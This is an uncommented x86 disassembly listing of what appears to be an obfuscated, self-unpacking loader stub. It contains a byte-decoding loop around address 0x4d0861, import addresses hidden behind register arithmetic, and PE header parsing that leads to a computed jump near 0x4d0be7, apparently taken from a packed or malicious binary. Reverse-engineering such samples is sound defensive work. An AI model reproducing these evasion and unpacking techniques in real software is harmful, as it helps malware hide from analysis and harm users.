  4d07a9:	add    BYTE PTR [eax],al
  4d07ab:	add    BYTE PTR [edi-0x1],bl
  4d07ae:	adc    eax,0x4d2090
  4d07b3:	call   edi
  4d07b5:	add    BYTE PTR [eax],al
  4d07b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07bd:	sub    esp,0x2c
  4d07c0:	lea    edx,[esi+0x118]
  4d07c6:	cmp    edx,0x2e5c
  4d07cc:	jbe    0x4d07bb
  4d07ce:	push   edx
  4d07cf:	push   edi
  4d07d0:	push   DWORD PTR [edx+0x94]
  4d07d6:	call   0x4d0e38
  4d07db:	add    esp,0x8
  4d07de:	pop    edx
  4d07df:	push   edx
  4d07e0:	lea    edi,[edx-0x154]
  4d07e6:	push   edi
  4d07e7:	call   0x4d0ed8
  4d07ec:	add    esp,0x4
  4d07ef:	test   eax,eax
  4d07f1:	jne    0x4d07e0
  4d07f3:	pop    edx
  4d07f4:	push   edx
  4d07f5:	call   0x4d1180
  4d07fa:	add    esp,0x4
  4d07fd:	pop    edx
  4d07fe:	add    esp,0x2c
  4d0801:	pop    ebp
  4d0802:	ret    
  4d0803:	add    BYTE PTR [edi-0x1],bl
  4d0806:	adc    eax,0x4d203c
  4d080b:	call   edi
  4d080d:	add    BYTE PTR [eax],al
  4d080f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0815:	sub    esp,0x60
  4d0818:	cmp    edx,0x6054
  4d081e:	jbe    0x4d0813
  4d0820:	lea    esi,[edx-0x58]
  4d0823:	mov    eax,0x6ac
  4d0828:	push   eax
  4d0829:	push   0x6ac
  4d082e:	mov    ebx,0x40001
  4d0833:	push   ebx
  4d0834:	mov    ebx,0x86298596
  4d0839:	push   DWORD PTR [ebx+0x7a239a86]
  4d083f:	sub    DWORD PTR [esp],0x2
  4d0843:	mov    ebx,0x4d2028
  4d0848:	pop    DWORD PTR [ebx]
  4d084a:	call   0x4d0b84
  4d084f:	add    esp,0x4
  4d0852:	push   eax
  4d0853:	pop    DWORD PTR [esi+0x134]
  4d0859:	mov    eax,DWORD PTR [esi+0x134]
  4d085f:	mov    eax,eax
  4d0861:	sub    ecx,ecx
  4d0863:	dec    ecx
  4d0864:	and    ecx,0x4d0014
  4d086a:	mov    edx,0xd5d9a824
  4d086f:	xor    ebx,ebx
  4d0871:	xor    edi,edi
  4d0873:	push   DWORD PTR [ecx+edi*1]
  4d0876:	add    DWORD PTR [esp],edx
  4d0879:	pop    DWORD PTR [eax+edi*2]
  4d087c:	dec    DWORD PTR [eax]
  4d087e:	xor    edx,edx
  4d0880:	add    edx,DWORD PTR [ecx]
  4d0882:	add    ecx,0x4
  4d0885:	add    eax,0x4
  4d0888:	add    ebx,0x4
  4d088b:	cmp    ebx,0x6ac
  4d0891:	jne    0x4d0871
  4d0893:	push   0x0
  4d0895:	call   0x4d06ec
  4d089a:	add    esp,0x4
  4d089d:	add    esp,0x60
  4d08a0:	pop    ebp
  4d08a1:	ret    
  4d08a2:	add    BYTE PTR [eax],al
  4d08a4:	pop    edi
  4d08a5:	call   DWORD PTR ds:0x4d2080
  4d08ab:	call   edi
  4d08ad:	add    BYTE PTR [eax],al
  4d08af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08b5:	sub    esp,0x50
  4d08b8:	lea    ebx,[esi-0xb4]
  4d08be:	sbb    DWORD PTR [ebp-0x30],esi
  4d08c1:	mov    ecx,0x0
  4d08c6:	push   ecx
  4d08c7:	call   0x4d145c
  4d08cc:	add    esp,0x4
  4d08cf:	push   ebx
  4d08d0:	push   DWORD PTR [ebx+0x6c]
  4d08d3:	push   ecx
  4d08d4:	push   DWORD PTR [ebx+0x1b8]
  4d08da:	push   edi
  4d08db:	call   0x4d0e80
  4d08e0:	add    esp,0x10
  4d08e3:	pop    ebx
  4d08e4:	push   0x0
  4d08e6:	call   0x4d111c
  4d08eb:	add    esp,0x4
  4d08ee:	add    esp,0x50
  4d08f1:	pop    ebp
  4d08f2:	ret    
  4d08f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08f9:	sub    esp,0x20
  4d08fc:	mov    ecx,0x4d3158
  4d0901:	xor    edx,DWORD PTR [ebp-0x10]
  4d0904:	push   ecx
  4d0905:	push   DWORD PTR [ecx+0x8]
  4d0908:	push   DWORD PTR [ecx+0x88]
  4d090e:	push   esi
  4d090f:	call   0x4d0c98
  4d0914:	add    esp,0xc
  4d0917:	pop    ecx
  4d0918:	push   ecx
  4d0919:	call   0x4d1180
  4d091e:	add    esp,0x4
  4d0921:	pop    ecx
  4d0922:	push   ecx
  4d0923:	mov    edx,0x0
  4d0928:	push   edx
  4d0929:	call   0x4d09e8
  4d092e:	add    esp,0x4
  4d0931:	pop    ecx
  4d0932:	add    esp,0x20
  4d0935:	pop    ebp
  4d0936:	ret    
  4d0937:	add    BYTE PTR [edi-0x1],bl
  4d093a:	adc    eax,0x4d204c
  4d093f:	call   edi
  4d0941:	add    BYTE PTR [eax],al
  4d0943:	add    BYTE PTR [edi-0x1],bl
  4d0946:	adc    eax,0x4d2008
  4d094b:	call   edi
  4d094d:	add    BYTE PTR [eax],al
  4d094f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0955:	sub    esp,0x38
  4d0958:	mov    eax,0x4d3034
  4d095d:	mov    ebx,DWORD PTR [eax+0x168]
  4d0963:	push   eax
  4d0964:	push   esi
  4d0965:	push   DWORD PTR [eax+0x64]
  4d0968:	push   esi
  4d0969:	push   esi
  4d096a:	call   0x4d06f8
  4d096f:	add    esp,0x10
  4d0972:	pop    eax
  4d0973:	push   eax
  4d0974:	mov    edx,0x0
  4d0979:	push   edx
  4d097a:	call   0x4d0938
  4d097f:	add    esp,0x4
  4d0982:	pop    eax
  4d0983:	push   eax
  4d0984:	push   0x0
  4d0986:	call   0x4d0a00
  4d098b:	add    esp,0x4
  4d098e:	pop    eax
  4d098f:	add    esp,0x38
  4d0992:	pop    ebp
  4d0993:	ret    
  4d0994:	mov    edi,edi
  4d0996:	push   ebp
  4d0997:	mov    ebp,esp
  4d0999:	sub    esp,0x40
  4d099c:	lea    esi,ds:0x4d3020
  4d09a2:	adc    DWORD PTR [esi+0x1b8],edi
  4d09a8:	push   esi
  4d09a9:	push   DWORD PTR [esi+0x140]
  4d09af:	push   DWORD PTR [esi+0xa8]
  4d09b5:	push   DWORD PTR [esi+0x1c8]
  4d09bb:	push   DWORD PTR [esi+0x1a4]
  4d09c1:	call   0x4d10d8
  4d09c6:	add    esp,0x10
  4d09c9:	pop    esi
  4d09ca:	call   0x4d0fec
  4d09cf:	add    esp,0x4
  4d09d2:	mov    edx,0x0
  4d09d7:	push   edx
  4d09d8:	call   0x4d09e8
  4d09dd:	add    esp,0x4
  4d09e0:	add    esp,0x40
  4d09e3:	pop    ebp
  4d09e4:	ret    
  4d09e5:	add    BYTE PTR [eax],al
  4d09e7:	add    BYTE PTR [edi-0x1],bl
  4d09ea:	adc    eax,0x4d2074
  4d09ef:	call   edi
  4d09f1:	add    BYTE PTR [eax],al
  4d09f3:	add    BYTE PTR [edi-0x1],bl
  4d09f6:	adc    eax,0x4d209c
  4d09fb:	call   edi
  4d09fd:	add    BYTE PTR [eax],al
  4d09ff:	add    BYTE PTR [edi-0x1],bl
  4d0a02:	adc    eax,0x4d2010
  4d0a07:	call   edi
  4d0a09:	add    BYTE PTR [eax],al
  4d0a0b:	add    BYTE PTR [edi-0x1],bl
  4d0a0e:	adc    eax,0x4d2024
  4d0a13:	call   edi
  4d0a15:	add    BYTE PTR [eax],al
  4d0a17:	add    BYTE PTR [edi-0x1],bl
  4d0a1a:	adc    eax,0x4d205c
  4d0a1f:	call   edi
  4d0a21:	add    BYTE PTR [eax],al
  4d0a23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a29:	sub    esp,0x24
  4d0a2c:	mov    eax,0x4d317c
  4d0a31:	mov    ebx,DWORD PTR [ebp-0x8]
  4d0a34:	push   eax
  4d0a35:	push   ebx
  4d0a36:	push   ebx
  4d0a37:	push   DWORD PTR [eax+0x8c]
  4d0a3d:	push   DWORD PTR [eax+0x88]
  4d0a43:	call   0x4d1554
  4d0a48:	add    esp,0x10
  4d0a4b:	pop    eax
  4d0a4c:	push   eax
  4d0a4d:	push   0x0
  4d0a4f:	call   0x4d06ec
  4d0a54:	add    esp,0x4
  4d0a57:	pop    eax
  4d0a58:	push   eax
  4d0a59:	push   0x0
  4d0a5b:	call   0x4d111c
  4d0a60:	add    esp,0x4
  4d0a63:	pop    eax
  4d0a64:	add    esp,0x24
  4d0a67:	pop    ebp
  4d0a68:	ret    
  4d0a69:	add    BYTE PTR [eax],al
  4d0a6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a71:	sub    esp,0x40
  4d0a74:	mov    edi,0x4d3124
  4d0a79:	and    edx,esi
  4d0a7b:	push   edi
  4d0a7c:	push   DWORD PTR [edi]
  4d0a7e:	push   DWORD PTR [edi+0x90]
  4d0a84:	call   0x4d0dc8
  4d0a89:	add    esp,0x8
  4d0a8c:	pop    edi
  4d0a8d:	push   edi
  4d0a8e:	lea    esi,[edi-0x124]
  4d0a94:	push   esi
  4d0a95:	call   0x4d0ed8
  4d0a9a:	add    esp,0x4
  4d0a9d:	test   eax,eax
  4d0a9f:	jne    0x4d0a8e
  4d0aa1:	pop    edi
  4d0aa2:	push   edi
  4d0aa3:	push   0x0
  4d0aa5:	call   0x4d0a00
  4d0aaa:	add    esp,0x4
  4d0aad:	pop    edi
  4d0aae:	add    esp,0x40
  4d0ab1:	pop    ebp
  4d0ab2:	ret    
  4d0ab3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ab9:	sub    esp,0x30
  4d0abc:	lea    esi,[ebx-0xc]
  4d0abf:	xor    DWORD PTR [esi+0x164],0x4c
  4d0ac6:	push   esi
  4d0ac7:	push   DWORD PTR [esi+0x38]
  4d0aca:	push   DWORD PTR [esi+0x10c]
  4d0ad0:	call   0x4d0a24
  4d0ad5:	add    esp,0x8
  4d0ad8:	pop    esi
  4d0ad9:	mov    edx,0x0
  4d0ade:	push   edx
  4d0adf:	call   0x4d0a00
  4d0ae4:	add    esp,0x4
  4d0ae7:	push   0x0
  4d0ae9:	call   0x4d0938
  4d0aee:	add    esp,0x4
  4d0af1:	add    esp,0x30
  4d0af4:	pop    ebp
  4d0af5:	ret    
  4d0af6:	add    BYTE PTR [eax],al
  4d0af8:	mov    edi,edi
  4d0afa:	push   ebp
  4d0afb:	mov    ebp,esp
  4d0afd:	sub    esp,0x3c
  4d0b00:	lea    ebx,[ecx+0x28]
  4d0b03:	or     DWORD PTR [ebx+0x148],0x23
  4d0b0a:	mov    ecx,0x0
  4d0b0f:	push   ecx
  4d0b10:	call   0x4d0f3c
  4d0b15:	add    esp,0x4
  4d0b18:	push   ebx
  4d0b19:	push   edi
  4d0b1a:	push   DWORD PTR [ebx+0x174]
  4d0b20:	call   0x4d1518
  4d0b25:	add    esp,0x8
  4d0b28:	pop    ebx
  4d0b29:	mov    edi,0x0
  4d0b2e:	push   edi
  4d0b2f:	call   0x4d09e8
  4d0b34:	add    esp,0x4
  4d0b37:	add    esp,0x3c
  4d0b3a:	pop    ebp
  4d0b3b:	ret    
  4d0b3c:	mov    edi,edi
  4d0b3e:	push   ebp
  4d0b3f:	mov    ebp,esp
  4d0b41:	sub    esp,0x3c
  4d0b44:	lea    eax,[edi-0xa0]
  4d0b4a:	adc    DWORD PTR [eax-0x158],0xffffe296
  4d0b54:	push   eax
  4d0b55:	push   0x0
  4d0b57:	call   0x4d0794
  4d0b5c:	add    esp,0x4
  4d0b5f:	pop    eax
  4d0b60:	push   eax
  4d0b61:	push   edx
  4d0b62:	push   DWORD PTR [eax+0x134]
  4d0b68:	call   0x4d141c
  4d0b6d:	add    esp,0x8
  4d0b70:	pop    eax
  4d0b71:	push   eax
  4d0b72:	push   0x0
  4d0b74:	call   0x4d06ec
  4d0b79:	add    esp,0x4
  4d0b7c:	pop    eax
  4d0b7d:	add    esp,0x3c
  4d0b80:	pop    ebp
  4d0b81:	ret    
  4d0b82:	add    BYTE PTR [eax],al
  4d0b84:	pop    edi
  4d0b85:	call   DWORD PTR ds:0x4d2028
  4d0b8b:	call   edi
  4d0b8d:	add    BYTE PTR [eax],al
  4d0b8f:	add    BYTE PTR [edi-0x1],bl
  4d0b92:	adc    eax,0x4d2040
  4d0b97:	call   edi
  4d0b99:	add    BYTE PTR [eax],al
  4d0b9b:	add    BYTE PTR [edi-0x1],bl
  4d0b9e:	adc    eax,0x4d200c
  4d0ba3:	call   edi
  4d0ba5:	add    BYTE PTR [eax],al
  4d0ba7:	add    BYTE PTR [edi-0x1],bl
  4d0baa:	adc    eax,0x4d207c
  4d0baf:	call   edi
  4d0bb1:	add    BYTE PTR [eax],al
  4d0bb3:	add    BYTE PTR [edi+0x2b],dl
  4d0bb6:	call   DWORD PTR [edi+0x57]
  4d0bb9:	push   edi
  4d0bba:	push   edi
  4d0bbb:	call   0x4d0f8c
  4d0bc0:	sub    esp,0xfffffffc
  4d0bc3:	call   0x4d0a0c
  4d0bc8:	push   0x2
  4d0bca:	xor    eax,eax
  4d0bcc:	adc    eax,0x4d3030
  4d0bd1:	push   0x0
  4d0bd3:	xor    ecx,ecx
  4d0bd5:	adc    ecx,0x4d3036
  4d0bdb:	add    BYTE PTR [ecx],0x41
  4d0bde:	push   eax
  4d0bdf:	call   0x4d0b84
  4d0be4:	pop    edi
  4d0be5:	pop    edi
  4d0be6:	pop    edi
  4d0be7:	lea    edi,[eax+0x3b]
  4d0bea:	mov    edi,DWORD PTR [edi]
  4d0bec:	lea    eax,[eax+edi*1]
  4d0bef:	mov    eax,DWORD PTR [eax+0x28]
  4d0bf2:	pusha  
  4d0bf3:	mov    ah,0x45
  4d0bf5:	sub    al,ah
  4d0bf7:	ja     0x4d073c
  4d0bfd:	popa   
  4d0bfe:	ret    
  4d0bff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c05:	sub    esp,0x3c
  4d0c08:	mov    ebx,0x4d31bc
  4d0c0d:	or     edx,DWORD PTR [ebx-0x188]
  4d0c13:	mov    eax,0x0
  4d0c18:	push   eax
  4d0c19:	call   0x4d0a00
  4d0c1e:	add    esp,0x4
  4d0c21:	push   ebx
  4d0c22:	push   DWORD PTR [ebx+0x8]
  4d0c25:	push   ecx
  4d0c26:	push   ecx
  4d0c27:	push   DWORD PTR [ebx+0x70]
  4d0c2a:	call   0x4d0d28
  4d0c2f:	add    esp,0x10
  4d0c32:	pop    ebx
  4d0c33:	push   0xfffffff4
  4d0c35:	call   0x4d0b90
  4d0c3a:	add    esp,0x4
  4d0c3d:	add    esp,0x3c
  4d0c40:	pop    ebp
  4d0c41:	ret    
  4d0c42:	add    BYTE PTR [eax],al
  4d0c44:	mov    edi,edi
  4d0c46:	push   ebp
  4d0c47:	mov    ebp,esp
  4d0c49:	sub    esp,0x24
  4d0c4c:	mov    eax,0x4d31a4
  4d0c51:	adc    ecx,0x64
  4d0c54:	push   eax
  4d0c55:	push   DWORD PTR [eax+0x8]
  4d0c58:	push   esi
  4d0c59:	push   edx
  4d0c5a:	push   edi
  4d0c5b:	call   0x4d1134
  4d0c60:	add    esp,0x10
  4d0c63:	pop    eax
  4d0c64:	push   eax
  4d0c65:	call   0x4d0f8c
  4d0c6a:	add    esp,0x4
  4d0c6d:	pop    eax
  4d0c6e:	push   eax
  4d0c6f:	call   0x4d1180
  4d0c74:	add    esp,0x4
  4d0c77:	pop    eax
  4d0c78:	add    esp,0x24
  4d0c7b:	pop    ebp
  4d0c7c:	ret    
  4d0c7d:	add    BYTE PTR [eax],al
  4d0c7f:	add    BYTE PTR [edi-0x1],bl
  4d0c82:	adc    eax,0x4d2098
  4d0c87:	call   edi
  4d0c89:	add    BYTE PTR [eax],al
  4d0c8b:	add    BYTE PTR [edi-0x1],bl
  4d0c8e:	adc    eax,0x4d2064
  4d0c93:	call   edi
  4d0c95:	add    BYTE PTR [eax],al
  4d0c97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c9d:	sub    esp,0x44
  4d0ca0:	lea    edx,ds:0x4d305c
  4d0ca6:	mov    ebx,ecx
  4d0ca8:	push   edx
  4d0ca9:	push   esi
  4d0caa:	push   ebx
  4d0cab:	push   DWORD PTR [edx+0x1d4]
  4d0cb1:	call   0x4d14c8
  4d0cb6:	add    esp,0xc
  4d0cb9:	pop    edx
  4d0cba:	push   edx
  4d0cbb:	mov    ecx,0x0
  4d0cc0:	push   ecx
  4d0cc1:	call   0x4d0794
  4d0cc6:	add    esp,0x4
  4d0cc9:	pop    edx
  4d0cca:	push   edx
  4d0ccb:	push   0x0
  4d0ccd:	call   0x4d0944
  4d0cd2:	add    esp,0x4
  4d0cd5:	pop    edx
  4d0cd6:	add    esp,0x44
  4d0cd9:	pop    ebp
  4d0cda:	ret    
  4d0cdb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ce1:	sub    esp,0x50
  4d0ce4:	lea    ebx,ds:0x4d309c
  4d0cea:	xor    DWORD PTR [ebp-0x14],0xffffec8d
  4d0cf1:	call   0x4d0fec
  4d0cf6:	add    esp,0x4
  4d0cf9:	push   ebx
  4d0cfa:	push   DWORD PTR [ebx+0x12c]
  4d0d00:	push   DWORD PTR [ebx+0x98]
  4d0d06:	push   edi
  4d0d07:	push   DWORD PTR [ebx+0x1f4]
  4d0d0d:	call   0x4d0ef0
  4d0d12:	add    esp,0x10
  4d0d15:	pop    ebx
  4d0d16:	push   0x0
  4d0d18:	call   0x4d0944
  4d0d1d:	add    esp,0x4
  4d0d20:	add    esp,0x50
  4d0d23:	pop    ebp
  4d0d24:	ret    
  4d0d25:	add    BYTE PTR [eax],al
  4d0d27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d2d:	sub    esp,0x3c
  4d0d30:	mov    edi,0x4d31e4
  4d0d35:	xor    ecx,DWORD PTR [ebp-0x34]
  4d0d38:	push   edi
  4d0d39:	push   DWORD PTR [edi+0x100]
  4d0d3f:	push   ecx
  4d0d40:	call   0x4d0ff8
  4d0d45:	add    esp,0x8
  4d0d48:	pop    edi
  4d0d49:	push   edi
  4d0d4a:	mov    ebx,0x0
  4d0d4f:	push   ebx
  4d0d50:	call   0x4d145c
  4d0d55:	add    esp,0x4
  4d0d58:	pop    edi
  4d0d59:	push   edi
  4d0d5a:	push   0x0
  4d0d5c:	call   0x4d0794
  4d0d61:	add    esp,0x4
  4d0d64:	pop    edi
  4d0d65:	add    esp,0x3c
  4d0d68:	pop    ebp
  4d0d69:	ret    
  4d0d6a:	add    BYTE PTR [eax],al
  4d0d6c:	mov    edi,edi
  4d0d6e:	push   ebp
  4d0d6f:	mov    ebp,esp
  4d0d71:	sub    esp,0x48
  4d0d74:	lea    edi,ds:0x4d31fc
  4d0d7a:	adc    ebx,0xffffd45a
  4d0d80:	push   edi
  4d0d81:	push   0x0
  4d0d83:	call   0x4d0794
  4d0d88:	add    esp,0x4
  4d0d8b:	pop    edi
  4d0d8c:	push   edi
  4d0d8d:	push   DWORD PTR [edi+0x1d4]
  4d0d93:	push   ebx
  4d0d94:	push   esi
  4d0d95:	push   esi
  4d0d96:	call   0x4d0b3c
  4d0d9b:	add    esp,0x10
  4d0d9e:	pop    edi
  4d0d9f:	push   edi
  4d0da0:	lea    ebx,[edi-0x1fc]
  4d0da6:	push   ebx
  4d0da7:	call   0x4d0ed8
  4d0dac:	add    esp,0x4
  4d0daf:	test   eax,eax
  4d0db1:	jne    0x4d0da0
  4d0db3:	pop    edi
  4d0db4:	add    esp,0x48
  4d0db7:	pop    ebp
  4d0db8:	ret    
  4d0db9:	add    BYTE PTR [eax],al
  4d0dbb:	add    BYTE PTR [edi-0x1],bl
  4d0dbe:	adc    eax,0x4d208c
  4d0dc3:	call   edi
  4d0dc5:	add    BYTE PTR [eax],al
  4d0dc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dcd:	sub    esp,0x30
  4d0dd0:	lea    eax,ds:0x4d31ac
  4d0dd6:	or     DWORD PTR [eax-0xa8],0xffffe36e
  4d0de0:	push   eax
  4d0de1:	push   DWORD PTR [eax+0x1b4]
  4d0de7:	push   edi
  4d0de8:	call   0x4d0d6c
  4d0ded:	add    esp,0x8
  4d0df0:	pop    eax
  4d0df1:	push   eax
  4d0df2:	mov    edx,0x0
  4d0df7:	push   edx
  4d0df8:	call   0x4d0a00
  4d0dfd:	add    esp,0x4
  4d0e00:	pop    eax
  4d0e01:	push   eax
  4d0e02:	push   0x0
  4d0e04:	call   0x4d0f3c
  4d0e09:	add    esp,0x4
  4d0e0c:	pop    eax
  4d0e0d:	add    esp,0x30
  4d0e10:	pop    ebp
  4d0e11:	ret    
  4d0e12:	add    BYTE PTR [eax],al
  4d0e14:	pop    edi
  4d0e15:	call   DWORD PTR ds:0x4d2094
  4d0e1b:	call   edi
  4d0e1d:	add    BYTE PTR [eax],al
  4d0e1f:	add    BYTE PTR [edi-0x1],bl
  4d0e22:	adc    eax,0x4d2088
  4d0e27:	call   edi
  4d0e29:	add    BYTE PTR [eax],al
  4d0e2b:	add    BYTE PTR [edi-0x1],bl
  4d0e2e:	adc    eax,0x4d2070
  4d0e33:	call   edi
  4d0e35:	add    BYTE PTR [eax],al
  4d0e37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e3d:	sub    esp,0x20
  4d0e40:	lea    esi,[edx-0x80]
  4d0e46:	adc    DWORD PTR [ebp-0x1c],0xffffffe2
  4d0e4a:	push   esi
  4d0e4b:	push   DWORD PTR [esi+0x19c]
  4d0e51:	push   DWORD PTR [esi+0x104]
  4d0e57:	push   DWORD PTR [esi+0x54]
  4d0e5a:	call   0x4d08b0
  4d0e5f:	add    esp,0xc
  4d0e62:	pop    esi
  4d0e63:	mov    ecx,0x0
  4d0e68:	push   ecx
  4d0e69:	call   0x4d0f3c
  4d0e6e:	add    esp,0x4
  4d0e71:	push   0xfffffff4
  4d0e73:	call   0x4d0b90
  4d0e78:	add    esp,0x4
  4d0e7b:	add    esp,0x20
  4d0e7e:	pop    ebp
  4d0e7f:	ret    
  4d0e80:	mov    edi,edi
  4d0e82:	push   ebp
  4d0e83:	mov    ebp,esp
  4d0e85:	sub    esp,0x28
  4d0e88:	lea    edx,ds:0x4d3190
  4d0e8e:	sub    eax,0xffffff82
  4d0e91:	push   edx
  4d0e92:	push   0x0
  4d0e94:	call   0x4d06ec
  4d0e99:	add    esp,0x4
  4d0e9c:	pop    edx
  4d0e9d:	push   edx
  4d0e9e:	push   ecx
  4d0e9f:	push   eax
  4d0ea0:	push   edi
  4d0ea1:	push   edi
  4d0ea2:	call   0x4d08f4
  4d0ea7:	add    esp,0x10
  4d0eaa:	pop    edx
  4d0eab:	push   edx
  4d0eac:	mov    eax,0x0
  4d0eb1:	push   eax
  4d0eb2:	call   0x4d06ec
  4d0eb7:	add    esp,0x4
  4d0eba:	pop    edx
  4d0ebb:	add    esp,0x28
  4d0ebe:	pop    ebp
  4d0ebf:	ret    
  4d0ec0:	pop    edi
  4d0ec1:	call   DWORD PTR ds:0x4d201c
  4d0ec7:	call   edi
  4d0ec9:	add    BYTE PTR [eax],al
  4d0ecb:	add    BYTE PTR [edi-0x1],bl
  4d0ece:	adc    eax,0x4d206c
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [edi-0x1],bl
  4d0eda:	adc    eax,0x4d2038
  4d0edf:	call   edi
  4d0ee1:	add    BYTE PTR [eax],al
  4d0ee3:	add    BYTE PTR [edi-0x1],bl
  4d0ee6:	adc    eax,0x4d2020
  4d0eeb:	call   edi
  4d0eed:	add    BYTE PTR [eax],al
  4d0eef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ef5:	sub    esp,0x1c
  4d0ef8:	lea    esi,[ebx-0x5c]
  4d0efb:	xor    ecx,0xffffddeb
  4d0f01:	push   esi
  4d0f02:	push   DWORD PTR [esi+0xb4]
  4d0f08:	push   ecx
  4d0f09:	call   0x4d0f98
  4d0f0e:	add    esp,0x8
  4d0f11:	pop    esi
  4d0f12:	call   0x4d0fec
  4d0f17:	add    esp,0x4
  4d0f1a:	mov    eax,0x0
  4d0f1f:	push   eax
  4d0f20:	call   0x4d09e8
  4d0f25:	add    esp,0x4
  4d0f28:	add    esp,0x1c
  4d0f2b:	pop    ebp
  4d0f2c:	ret    
  4d0f2d:	add    BYTE PTR [eax],al
  4d0f2f:	add    BYTE PTR [edi-0x1],bl
  4d0f32:	adc    eax,0x4d2048
  4d0f37:	call   edi
  4d0f39:	add    BYTE PTR [eax],al
  4d0f3b:	add    BYTE PTR [edi-0x1],bl
  4d0f3e:	adc    eax,0x4d2000
  4d0f43:	call   edi
  4d0f45:	add    BYTE PTR [eax],al
  4d0f47:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f4d:	sub    esp,0x2c
  4d0f50:	mov    edx,0x4d30f4
  4d0f55:	cmp    edx,0x388
  4d0f5b:	jb     0x4d0f4b
  4d0f5d:	push   edx
  4d0f5e:	push   ecx
  4d0f5f:	push   DWORD PTR [edx]
  4d0f61:	push   esi
  4d0f62:	call   0x4d0950
  4d0f67:	add    esp,0xc
  4d0f6a:	pop    edx
  4d0f6b:	push   edx
  4d0f6c:	mov    esi,0x0
  4d0f71:	push   esi
  4d0f72:	call   0x4d145c
  4d0f77:	add    esp,0x4
  4d0f7a:	pop    edx
  4d0f7b:	push   edx
  4d0f7c:	push   0xfffffff4
  4d0f7e:	call   0x4d0b90
  4d0f83:	add    esp,0x4
  4d0f86:	pop    edx
  4d0f87:	add    esp,0x2c
  4d0f8a:	pop    ebp
  4d0f8b:	ret    
  4d0f8c:	pop    edi
  4d0f8d:	call   DWORD PTR ds:0x4d2034
  4d0f93:	call   edi
  4d0f95:	add    BYTE PTR [eax],al
  4d0f97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f9d:	sub    esp,0x50
  4d0fa0:	lea    eax,ds:0x4d3130
  4d0fa6:	adc    DWORD PTR [eax-0x74],0xffffffaf
  4d0faa:	push   eax
  4d0fab:	push   DWORD PTR [eax+0x1a8]
  4d0fb1:	push   DWORD PTR [eax+0x134]
  4d0fb7:	push   ebx
  4d0fb8:	call   0x4d1594
  4d0fbd:	add    esp,0xc
  4d0fc0:	pop    eax
  4d0fc1:	push   eax
  4d0fc2:	mov    ecx,0x0
  4d0fc7:	push   ecx
  4d0fc8:	call   0x4d0794
  4d0fcd:	add    esp,0x4
  4d0fd0:	pop    eax
  4d0fd1:	push   eax
  4d0fd2:	lea    esi,[eax-0x130]
  4d0fd8:	push   esi
  4d0fd9:	call   0x4d0ed8
  4d0fde:	add    esp,0x4
  4d0fe1:	test   eax,eax
  4d0fe3:	jne    0x4d0fd2
  4d0fe5:	pop    eax
  4d0fe6:	add    esp,0x50
  4d0fe9:	pop    ebp
  4d0fea:	ret    
  4d0feb:	add    BYTE PTR [edi-0x1],bl
  4d0fee:	adc    eax,0x4d2004
  4d0ff3:	call   edi
  4d0ff5:	add    BYTE PTR [eax],al
  4d0ff7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ffd:	sub    esp,0x5c
  4d1000:	lea    esi,ds:0x4d303c
  4d1006:	cmp    esi,0x6fc
  4d100c:	jbe    0x4d0ffb
  4d100e:	push   esi
  4d100f:	push   DWORD PTR [esi+0x100]
  4d1015:	push   ebx
  4d1016:	push   DWORD PTR [esi+0x1e0]
  4d101c:	push   DWORD PTR [esi+0x158]
  4d1022:	call   0x4d07b8
  4d1027:	add    esp,0x10
  4d102a:	pop    esi
  4d102b:	mov    edi,0x0
  4d1030:	push   edi
  4d1031:	call   0x4d06ec
  4d1036:	add    esp,0x4
  4d1039:	call   0x4d0fec
  4d103e:	add    esp,0x4
  4d1041:	add    esp,0x5c
  4d1044:	pop    ebp
  4d1045:	ret    
  4d1046:	add    BYTE PTR [eax],al
  4d1048:	mov    edi,edi
  4d104a:	push   ebp
  4d104b:	mov    ebp,esp
  4d104d:	sub    esp,0x60
  4d1050:	mov    ebx,0x4d31e4
  4d1055:	and    edx,esi
  4d1057:	push   ebx
  4d1058:	push   eax
  4d1059:	push   DWORD PTR [ebx+0xe0]
  4d105f:	push   DWORD PTR [ebx+0x168]
  4d1065:	push   eax
  4d1066:	call   0x4d0a6c
  4d106b:	add    esp,0x10
  4d106e:	pop    ebx
  4d106f:	mov    edi,0x0
  4d1074:	push   edi
  4d1075:	call   0x4d145c
  4d107a:	add    esp,0x4
  4d107d:	mov    ecx,0x0
  4d1082:	push   ecx
  4d1083:	call   0x4d0f3c
  4d1088:	add    esp,0x4
  4d108b:	add    esp,0x60
  4d108e:	pop    ebp
  4d108f:	ret    
  4d1090:	mov    edi,edi
  4d1092:	push   ebp
  4d1093:	mov    ebp,esp
  4d1095:	sub    esp,0x48
  4d1098:	lea    ebx,ds:0x4d3064
  4d109e:	mov    ecx,0x4ab3
  4d10a3:	push   ebx
  4d10a4:	push   DWORD PTR [ebx+0x64]
  4d10a7:	push   DWORD PTR [ebx+0x148]
  4d10ad:	call   0x4d11d0
  4d10b2:	add    esp,0x8
  4d10b5:	pop    ebx
  4d10b6:	mov    eax,0x0
  4d10bb:	push   eax
  4d10bc:	call   0x4d06ec
  4d10c1:	add    esp,0x4
  4d10c4:	mov    edx,0x0
  4d10c9:	push   edx
  4d10ca:	call   0x4d111c
  4d10cf:	add    esp,0x4
  4d10d2:	add    esp,0x48
  4d10d5:	pop    ebp
  4d10d6:	ret    
  4d10d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10dd:	sub    esp,0x2c
  4d10e0:	lea    ebx,ds:0x4d3064
  4d10e6:	and    DWORD PTR [ebx-0x2c],eax
  4d10e9:	push   0x0
